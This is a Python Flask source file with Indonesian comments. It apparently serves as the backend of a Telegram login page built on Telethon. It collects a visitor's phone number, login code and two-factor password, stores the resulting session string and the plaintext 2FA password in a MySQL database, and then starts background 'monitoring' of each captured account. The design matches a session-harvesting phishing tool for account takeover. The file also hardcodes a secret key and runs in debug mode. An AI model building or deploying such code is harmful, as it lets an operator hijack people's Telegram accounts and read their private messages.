from flask import Flask, render_template, request, redirect, session
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import mysql.connector
import asyncio
from threading import Thread
from monitoring.telegram_client import start_monitoring, monitor_all_users
from config import API_ID, API_HASH, MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE

app = Flask(__name__)
app.secret_key = b'\xf8\xe4TA\x84\xe3r\x95\xfbH4\x17\x0b\xf7t\x94\xb3\x08k)\x13Fp}'

# Event loop untuk background task
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# Fungsi untuk menjalankan event loop di thread terpisah
def run_event_loop():
    loop.run_forever()

# Mulai event loop di thread terpisah
loop_thread = Thread(target=run_event_loop, daemon=True)
loop_thread.start()

# Fungsi untuk mendapatkan koneksi ke MySQL
def get_mysql_connection():
    return mysql.connector.connect(
        host=MYSQL_HOST,
        user=MYSQL_USER,
        password=MYSQL_PASSWORD,
        database=MYSQL_DATABASE,
    )

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/send_otp', methods=['POST'])
def send_otp():
    phone = request.form['phone']

    async def send_code():
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        sent = await client.send_code_request(phone)
        phone_code_hash = sent.phone_code_hash  # Simpan phone_code_hash

        conn = get_mysql_connection()
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO users (phone, session, phone_code_hash)
            VALUES (%s, %s, %s)
            ON DUPLICATE KEY UPDATE session = VALUES(session), phone_code_hash = VALUES(phone_code_hash)
        ''', (phone, StringSession.save(client.session), phone_code_hash))
        conn.commit()
        conn.close()
        return True

    try:
        asyncio.run_coroutine_threadsafe(send_code(), loop).result()
        return render_template('otp.html', phone=phone)
    except Exception as e:
        return f"Error: {e}"

@app.route('/verify_otp', methods=['POST'])
def verify_otp():
    phone = request.form['phone']
    otp = request.form['otp']

    async def verify_code():
        conn = get_mysql_connection()
        cursor = conn.cursor(dictionary=True)
        cursor.execute('SELECT session, phone_code_hash FROM users WHERE phone = %s', (phone,))
        row = cursor.fetchone()
        conn.close()

        if row:
            session_string, phone_code_hash = row['session'], row['phone_code_hash']
            client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
                conn = get_mysql_connection()
                cursor = conn.cursor()
                cursor.execute(
                    'UPDATE users SET session = %s, monitoring = 1 WHERE phone = %s',
                    (StringSession.save(client.session), phone)
                )
                conn.commit()
                conn.close()
                return "success"
            except SessionPasswordNeededError:
                return "password_required"
            except Exception as e:
                return f"Error: {e}"
        return "Error: Client not found"

    try:
        result = asyncio.run_coroutine_threadsafe(verify_code(), loop).result()
        if result == "success":
            asyncio.run_coroutine_threadsafe(start_monitoring(phone), loop)
            return "Logged in successfully!"
        elif result == "password_required":
            return render_template('password.html', phone=phone)
        else:
            return result
    except Exception as e:
        return f"Error: {e}"


@app.route('/verify_password', methods=['POST'])
def verify_password():
    phone = request.form['phone']
    password = request.form['password']

    async def login_with_password():
        conn = get_mysql_connection()
        cursor = conn.cursor(dictionary=True)
        cursor.execute('SELECT session FROM users WHERE phone = %s', (phone,))
        row = cursor.fetchone()
        conn.close()

        if row:
            client = TelegramClient(StringSession(row['session']), API_ID, API_HASH)
            await client.connect()
            try:
                await client.sign_in(password=password)
                conn = get_mysql_connection()
                cursor = conn.cursor()
                cursor.execute('''
                    UPDATE users 
                    SET session = %s, password = %s, monitoring = 1 
                    WHERE phone = %s
                ''', (StringSession.save(client.session), password, phone))
                conn.commit()
                conn.close()

                # Mulai monitoring setelah berhasil login
                asyncio.run_coroutine_threadsafe(start_monitoring(phone), loop)
                return "success"
            except Exception as e:
                return f"Error: {e}"
        return "Error: Client not found"

    try:
        result = asyncio.run_coroutine_threadsafe(login_with_password(), loop).result()
        if result == "success":
            return "Logged in successfully!"
        else:
            return result
    except Exception as e:
        return f"Error: {e}"

if __name__ == '__main__':
    # Jalankan monitoring semua pengguna secara paralel saat aplikasi dimulai
    asyncio.run_coroutine_threadsafe(monitor_all_users(), loop)
    app.run(debug=True)
